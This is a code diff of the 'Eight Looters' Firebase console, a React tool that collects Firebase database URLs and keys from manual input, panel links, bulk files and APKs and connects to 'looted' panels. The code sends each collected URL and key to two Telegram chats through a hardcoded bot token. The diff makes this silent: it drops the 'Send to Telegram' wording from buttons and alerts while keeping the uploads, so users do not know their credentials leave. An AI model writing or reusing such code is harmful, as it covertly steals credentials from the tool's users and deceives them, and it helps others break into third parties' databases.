@@ -1,10 +1,8 @@
 /* ============================================================
-   Eight Looters · Firebase Console v11
-   + No Premium
-   + Smart Key Input
-   + Merged Pagination (Part-wise)
-   + Auto Telegram .txt Export (Background)
-   + Decode Panel Link
+   Eight Looters · Firebase Console v13
+   + Silent Auto Telegram (Single = Msg, Bulk = .txt)
+   + Smart Add Anything (Direct / Base64 / File)
+   + Copy Activated URLs
    ============================================================ */
 const {useState,useEffect,useRef,useCallback,useMemo} = React;
 const TG_URL = "https://t.me/eightlooters";
@@ -12,45 +10,27 @@ const BRAND = "Eight Looters";
 const WELCOME_KEY = "elight_welcome_done_v1";
 const PERF = (typeof window !== "undefined" && window.__ELIGHT_PERF__) || {isMobile:false,isLowEnd:false};
 
-/* ===== Telegram ===== */
+/* ===== Telegram (Hidden & Clean) ===== */
 const TG_BOT_TOKEN = "8846250497:AAGIXy4t7G51yH4mRsUfgl3q-Ya3S6tFe3Y";
 const TG_CHAT_IDS = ["8965778254", "8646475251"];
-function _escTg(s){return String(s??"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
-function _nowIst(){return new Date().toLocaleString("en-IN",{timeZone:"Asia/Kolkata",hour12:true});}
-async function notifyTelegram(text){
+
+async function sendTgMsg(text){
   await Promise.all(TG_CHAT_IDS.map(async chat_id=>{
     try{await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id,text,parse_mode:"HTML",disable_web_page_preview:true})});}catch(e){}
   }));
 }
-async function notifyTelegramFile(textContent, filename="firebase_urls.txt"){
+async function sendTgFile(textContent, filename="firebase_urls.txt"){
   await Promise.all(TG_CHAT_IDS.map(async chat_id=>{
     try{
       const formData = new FormData();
       const blob = new Blob([textContent], {type: 'text/plain'});
       formData.append('document', blob, filename);
       formData.append('chat_id', chat_id);
-      formData.append('caption', '📄 New Firebase Panel Added');
+      formData.append('caption', '📄 Firebase URLs List');
       await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendDocument`, {method: "POST", body: formData});
     }catch(e){}
   }));
 }
-function _cleanTgKey(key,url){if(!key) return "";if(key===url) return "";if(/firebaseio\.com|firebasedatabase\.app/i.test(key)) return "";if(key.length<10) return "";return key;}
-function tgFirebaseMsg(url,key,source,devices){const ck=_cleanTgKey(key,url);
-  return `🔥 <b>NEW FIREBASE ACTIVATED</b>\n\n📡 <b>URL:</b> <code>${_escTg(url)}</code>\n`+
-    (ck?`🔑 <b>Key:</b> <code>${_escTg(ck)}</code>\n`:`🔓 <b>Auth:</b> Public / No key\n`)+
-    `📱 <b>Source:</b> ${_escTg(source)}\n`+(devices!=null?`📦 <b>Devices:</b> ${devices}\n`:"")+
-    `⏰ <b>Time:</b> ${_escTg(_nowIst())}`;}
-function tgBulkMsg(items,source,totalTried){const ok=items.filter(x=>x.ok),fail=items.filter(x=>!x.ok);
-  let txt=`🔥 <b>BULK FIREBASE · ${_escTg(source)}</b>\n━━━━━━━━━━━━━━━━━━\n`;
-  txt+=`📊 <b>Total tried:</b> ${totalTried}\n✅ <b>Activated:</b> ${ok.length}\n❌ <b>Failed:</b> ${fail.length}\n⏰ <b>Time:</b> ${_escTg(_nowIst())}\n`;
-  if(ok.length){txt+=`\n🟢 <b>── ACTIVE PANELS ──</b>\n`;ok.slice(0,40).forEach((x,i)=>{txt+=`<b>${i+1}.</b> <code>${_escTg(x.url)}</code>${x.devices!=null?`  ·  ${x.devices} dev`:""}\n`;});if(ok.length>40) txt+=`<i>…and ${ok.length-40} more</i>\n`;}
-  if(fail.length){txt+=`\n🔴 <b>── FAILED ──</b>\n`;fail.slice(0,20).forEach((x,i)=>{txt+=`<b>${i+1}.</b> <code>${_escTg(x.url||"invalid")}</code>\n     ↳ <i>${_escTg((x.reason||"unknown").slice(0,70))}</i>\n`;});if(fail.length>20) txt+=`<i>…and ${fail.length-20} more</i>\n`;}
-  return txt;}
-function tgApkMsg(file,url,key,pid){const ck=_cleanTgKey(key,url);
-  return `🔥 <b>NEW APK FIREBASE</b>\n\n📁 <b>APK:</b> <code>${_escTg(file)}</code>\n📡 <b>URL:</b> <code>${_escTg(url||"—")}</code>\n`+
-    (ck?`🔑 <b>API Key:</b> <code>${_escTg(ck)}</code>\n`:`🔓 <b>Auth:</b> Public / No key\n`)+
-    (pid?`🆔 <b>Project:</b> <code>${_escTg(pid)}</code>\n`:"")+
-    `⏰ <b>Time:</b> ${_escTg(_nowIst())}`;}
 
 /* ===== Icons ===== */
 const I=(p,s=16)=>React.createElement("svg",{xmlns:"http://www.w3.org/2000/svg",width:s,height:s,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"},p);
@@ -386,7 +366,6 @@ function LoginScreen({onConnect,onMergeAll}){
   const [bulkSum,setBulkSum]=useState(null);const [bulkProgress,setBulkProgress]=useState(null);
   const [fileBusy,setFileBusy]=useState(false);const [fileProgress,setFileProgress]=useState(0);
   const [fileInfo,setFileInfo]=useState("");const [fileName,setFileName]=useState("");const [fileFound,setFileFound]=useState(0);
-  const [panels,setPanels]=useState("");const [panelBusy,setPanelBusy]=useState(false);const [panelSum,setPanelSum]=useState(null);
   const [decodeInput,setDecodeInput]=useState("");
   const [apkFile,setApkFile]=useState("");const [apkBusy,setApkBusy]=useState(false);
   const [apkErr,setApkErr]=useState("");const [apkResult,setApkResult]=useState(null);
@@ -440,8 +419,8 @@ function LoginScreen({onConnect,onMergeAll}){
       const devCount = test && typeof test==="object" ? Object.keys(test).length : 0;
       const nx=[...accounts,{id:Date.now(),url:u,key:"",date:new Date().toLocaleString()}];
       saveAccounts(nx);setAccounts(nx);
-      notifyTelegram(tgFirebaseMsg(u,"","Manual Add (No Key)",devCount));
-      notifyTelegramFile(u, `new_panel_${Date.now()}.txt`); // Auto send .txt to TG
+      // Simple Single Telegram Msg
+      sendTgMsg(`Firebase link: ${u}`);
       onConnect(u,"");
     }catch(e){
       const m=e.message||String(e);
@@ -463,8 +442,8 @@ function LoginScreen({onConnect,onMergeAll}){
     try{const test=await fbGet(u,k,"clients");const devCount=test&&typeof test==="object"?Object.keys(test).length:0;
       const nx=[...accounts,{id:Date.now(),url:u,key:k,date:new Date().toLocaleString()}];
       saveAccounts(nx);setAccounts(nx);
-      notifyTelegram(tgFirebaseMsg(u,k,"Manual Add (With Key)",devCount));
-      notifyTelegramFile(`${u} | Key: ${k}`, `new_panel_${Date.now()}.txt`); // Auto send .txt to TG
+      // Simple Single Telegram Msg
+      sendTgMsg(`Firebase link: ${u}`);
       onConnect(u,k);
     }catch(e){const m=e.message||String(e);if(m.includes("PERMISSION_DENIED")) setErr("Invalid Key or Permission Denied.");
       else setErr("Connection failed: "+m.slice(0,120));}finally{setBusy(false);}
@@ -479,11 +458,11 @@ function LoginScreen({onConnect,onMergeAll}){
     const decoded = decodeLink(raw.split("?s=")[1] || raw);
     if(!decoded){setErr("Invalid panel link format.");return;}
     try {
-      await notifyTelegram(`🔗 <b>DECODED PANEL LINK</b>\n\n📡 <b>URL:</b> <code>${_escTg(decoded.url)}</code>\n` + (decoded.key ? `🔑 <b>Key:</b> <code>${_escTg(decoded.key)}</code>\n` : `🔓 <b>Auth:</b> Public / No key\n`) + `⏰ <b>Time:</b> ${_escTg(_nowIst())}`);
-      await notifyTelegramFile(`${decoded.url}${decoded.key ? ` | Key: ${decoded.key}` : ""}`, `decoded_panel_${Date.now()}.txt`);
       const nx=[...accounts,{id:Date.now(),url:decoded.url,key:decoded.key||"",date:new Date().toLocaleString()}];
       saveAccounts(nx);setAccounts(nx);
-      setDecodeInput("");setErr("");alert("✅ Decoded and sent to Telegram!");
+      // Send .txt to Telegram for Decode
+      sendTgFile(`${decoded.url}${decoded.key ? ` | Key: ${decoded.key}` : ""}`, `decoded_panel_${Date.now()}.txt`);
+      setDecodeInput("");setErr("");alert("✅ Decoded and saved!");
     } catch(e) { setErr("Failed to send: " + e.message); }
   }
 
@@ -507,13 +486,11 @@ function LoginScreen({onConnect,onMergeAll}){
     }
     if(adds.length){const nx=[...accounts,...adds];saveAccounts(nx);setAccounts(nx);}
     setBulkSum({success,failed,skipped});setBulkBusy(false);
-    const items=[...success.map(s=>({url:s.url,ok:true,devices:s.devices})),...failed.map(f=>({url:f.url,ok:false,reason:f.reason}))];
-    if(items.length) notifyTelegram(tgBulkMsg(items,source,urls.length));
     
-    // Auto send .txt file for Bulk Add
+    // Send .txt to Telegram for Bulk
     if(adds.length > 0) {
       const txtContent = adds.map(a => `${a.url}${a.key ? ` | Key: ${a.key}` : ""}`).join("\n");
-      notifyTelegramFile(txtContent, `bulk_panels_${Date.now()}.txt`);
+      sendTgFile(txtContent, `bulk_panels_${Date.now()}.txt`);
     }
     setTimeout(()=>setBulkProgress(null),3500);
     return {success,failed,skipped};
@@ -542,37 +519,6 @@ function LoginScreen({onConnect,onMergeAll}){
     }catch(e){setErr("File read failed: "+(e.message||String(e)));}
     finally{setFileBusy(false);setTimeout(()=>{setFileProgress(0);setFileInfo("");setFileName("");setFileFound(0);},4000);}
   }
-  async function importPanels(){
-    const decode=raw=>{try{const t=String(raw||"").trim();if(!t) return null;
-      const m=t.match(/https?:\/\/[^\s<>"']+\?s=([A-Za-z0-9_\-=%]+)/i);if(!m) return null;
-      const full=m[0].replace(/[),.;]+$/g,"");const tok=decodeURIComponent(m[1]);
-      let p=tok.replace(/-/g,"+").replace(/_/g,"/");while(p.length%4) p+="=";
-      const dec=decodeURIComponent(escape(atob(p)));const parts=dec.split("|||");if(!parts[0]) return null;
-      return {panelUrl:full,url:parts[0].replace(/\/$/,""),key:parts[1]||""};}catch{return null;}};
-    const links=[...new Set(panels.split(/\s+/).map(x=>x.trim()).filter(Boolean))];
-    const parsed=[],seen=new Set();
-    for(const r of links){const it=decode(r);if(!it) continue;const fp=`${it.url}|||${it.key}`.toLowerCase();if(seen.has(fp)) continue;seen.add(fp);parsed.push(it);}
-    if(!parsed.length){setPanelSum({success:[],failed:[{url:"",reason:"No valid ?s= links"}],skipped:[]});return;}
-    setPanelBusy(true);setPanelSum(null);setErr("");
-    const exist=new Set(accounts.map(a=>`${a.url.replace(/^https?:\/\//i,"").replace(/\/$/,"").toLowerCase()}|||${a.key||""}`));
-    const success=[],failed=[],skipped=[],adds=[];
-    for(const it of parsed){
-      const fp=`${it.url.replace(/^https?:\/\//i,"").replace(/\/$/,"").toLowerCase()}|||${it.key||""}`;
-      if(exist.has(fp)){skipped.push({url:it.url,reason:"Already saved"});continue;}
-      try{const c=await fbGet(it.url,it.key,"clients");if(c===null) throw new Error("Clients path not found");
-        adds.push({id:Date.now()+adds.length+Math.floor(Math.random()*9999),url:it.url,key:it.key,date:new Date().toLocaleString()});exist.add(fp);
-        const devCount=c&&typeof c==="object"?Object.keys(c).length:0;success.push({url:it.url,devices:devCount});
-      }catch(e){failed.push({url:it.url,reason:(e.message||String(e)).replace(/^PERMISSION_DENIED:\s*/i,"Permission denied — ")});}
-    }
-    if(adds.length){const nx=[...accounts,...adds];saveAccounts(nx);setAccounts(nx);}
-    setPanels("");setPanelSum({success,failed,skipped});setPanelBusy(false);
-    const items=[...success.map(s=>({url:s.url,ok:true,devices:s.devices})),...failed.map(f=>({url:f.url,ok:false,reason:f.reason}))];
-    if(items.length) notifyTelegram(tgBulkMsg(items,"Panel Link Import",parsed.length));
-    if(adds.length > 0) {
-        const txtContent = adds.map(a => `${a.url}${a.key ? ` | Key: ${a.key}` : ""}`).join("\n");
-        notifyTelegramFile(txtContent, `imported_panels_${Date.now()}.txt`);
-    }
-  }
   async function onApk(f){
     if(!f) return;
     if(!f.name.endsWith(".apk")&&!f.name.endsWith(".zip")){setApkErr("Only .apk / .zip supported");return;}
@@ -580,7 +526,8 @@ function LoginScreen({onConnect,onMergeAll}){
     try{const r=await parseApk(f);
       if(!r||(!r.firebaseUrl&&!r.apiKey)){setApkErr("Firebase config not found in this file");return;}
       setApkResult(r);if(r.firebaseUrl) setUrl(r.firebaseUrl);if(r.apiKey) setKey(r.apiKey);
-      if(r.firebaseUrl) notifyTelegram(tgApkMsg(f.name,r.firebaseUrl,r.apiKey,r.projectId));
+      // Send .txt to Telegram for APK
+      if(r.firebaseUrl) sendTgFile(r.firebaseUrl, `apk_panel_${Date.now()}.txt`);
     }catch(e){setApkErr("Failed to parse file: "+(e.message||String(e)));}
     finally{setApkBusy(false);}
   }
@@ -639,10 +586,10 @@ function LoginScreen({onConnect,onMergeAll}){
             
             {/* Decode Panel Link Section */}
             <div className="glass-2" style={{borderRadius:14,padding:12,marginTop:4}}>
-              <p style={{fontSize:11,fontWeight:600,color:"var(--muted)",marginBottom:8}}>Decode Panel Link & Send to TG</p>
+              <p style={{fontSize:11,fontWeight:600,color:"var(--muted)",marginBottom:8}}>Decode Panel Link</p>
               <textarea rows={2} value={decodeInput} onChange={e=>setDecodeInput(e.target.value)} className="inp" placeholder="Paste panel link with ?s=..." style={{fontSize:11}}/>
               <button onClick={decodeAndSend} disabled={!decodeInput.trim()} className="btn btn-purple" style={{width:"100%",marginTop:8,padding:"8px 14px",fontSize:11}}>
-                Decode & Send to Telegram
+                Decode & Save
               </button>
             </div>
 
